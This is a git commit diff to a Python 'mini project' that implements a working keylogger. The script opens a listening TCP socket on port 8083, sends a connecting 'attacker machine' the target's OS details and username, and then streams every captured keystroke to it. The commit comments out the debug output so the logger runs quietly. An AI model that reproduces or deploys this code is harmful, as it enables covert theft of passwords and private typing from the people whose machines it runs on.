b5a57ca34d33f7c3f601d5e663d12d5ce28118b2
Jamaika <benarfi.2001@gmail.com>
2022-05-24 23:12:03 +0100

    Final Version Of Mini Project

--- My_Code.py
+++ My_Code.py
@@ -1,16 +1,15 @@
 import platform,os,socket
-from anyio import wait_socket_readable
 from pynput import keyboard
-from pynput.keyboard import Listener , Key
+from pynput.keyboard import Key
 
 def C_server(ip,port):
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Creating TCP-Ipv4 socket 
-    print('Socket has been created\n')# to be removed
+    #print('Socket has been created\n')# to be removed
     try:
         sock.bind((ip, port)) # Binding To (Ip,Port)
-        print('host Succesfully binded !\n')# to be removed
+        #print('host Succesfully binded !\n')# to be removed
     except Exception as err: # error hundling
-        print ('Binding has failed. Error Code is : ',err)# to be removed
+        #print ('Binding has failed. Error Code is : ',err)# to be removed
         exit()
 
     return sock # return socket object
@@ -19,52 +18,46 @@ def conn_hundler(sock):
     try :    
         sock.listen(1) # Listening For Connection From Attacker Machine
         connection_infos ,(client_host, client_port) = sock.accept() # Accepting connection and retrieving Connection Informations
-        print(f'Connection From: {client_host} on Port {client_port}\n')# to be removed
+        #print(f'Connection From: {client_host} on Port {client_port}\n')# to be removed
         connection_infos.sendall(f" Your Connected to a : {platform.uname().system} && version : {platform.uname().version} && User : {os.getlogin( )} \n".encode()) # sending Some Basic informations about "OS" of the Target
     except Exception as e : # error hundling 
-        print('failed to listen ! : '+e)# to be removed
+        #print('failed to listen ! : '+e)# to be removed
+        exit()
 
     return connection_infos # return connection informations 
 
 def Sender(remote_host,data):
-    try : 
+    try :
         remote_host.sendall(data.encode()) # Sending Informations encoded to the Attacker machine
         return True
     except Exception as e : # error hundling 
-        print(f'Error While Sending :{e} ')# to be removed
-
-def receiver(remote_host):
-    cmd = remote_host.recv(2048)
-    if len(cmd.decode()) != 0 and cmd.decode() == 'exit': # if it's a echap key 
-        print("here is the CMD : ",cmd.decode())
-        exit() # quit the programm
-    return True
+        #print(f'Error While Sending :{e} ')# to be removed
+        exit()
 
 def on_press(key):
-    pr_key = str(key) # Key object ---> Str 
-    if type(key) != type(Key.esc): # If It's Not A Special key
-        print(f" pressed : {pr_key} \n") # to be removed
-        Sender(remote_host,pr_key) # sending informations
     if key == Key.enter: # If It's A Special key ( Enter Key)
-        print(f" pressed : {pr_key} \n")# to be removed
-        Sender(remote_host,' \n ')   # send a '\n' for better formatting
+        #print(f" pressed : {pr_key} \n")# to be removed
+        Sender(remote_host,'\n')   # send a '\n' for better formatting
+        return True 
+    if key == Key.space: # If It's A Special key ( Space Key)
+        #print(f" pressed : {pr_key} \n")# to be removed
+        Sender(remote_host,' ')   # send a '\n' for better formatting
+        return True 
+    if type(key) != type(Key.esc): # If It's Not A Special key
+        #print(f" pressed : {pr_key} \n") # to be removed
+        Sender(remote_host,str(key)) # sending informations
+        return True 
     if type(key) == type(Key.esc): # If It's A Special key
-        print(f" pressed : {pr_key} \n")# to be removed
-        Sender(remote_host,' '+pr_key+' ') # for better formatting  
-    return True    
-
-def on_release(key):
-    #receiver(remote_host)
-    if key == Key.esc: # if it's a echap key 
-        exit() # quit the programm
+        #print(f" pressed : {pr_key} \n")# to be removed
+        Sender(remote_host,' '+str(key)+' ') # for better formatting 
+        return True   
 
 def wait_for_user_input():
-    listener = keyboard.Listener(on_press=on_press, on_release=on_release) # creating listener object
+    listener = keyboard.Listener(on_press=on_press) # creating listener object
     listener.start() # start the listener thread 
     listener.join() # wait till listener will stop
     # other stuff 
 
-remote_host = conn_hundler(C_server('0.0.0.0',8083)) # to be used in on_press func 
+remote_host = conn_hundler(C_server('0.0.0.0',8083)) # to be used in on_press function {Remote Connection Informations}
 
 print(wait_for_user_input()) # main
-
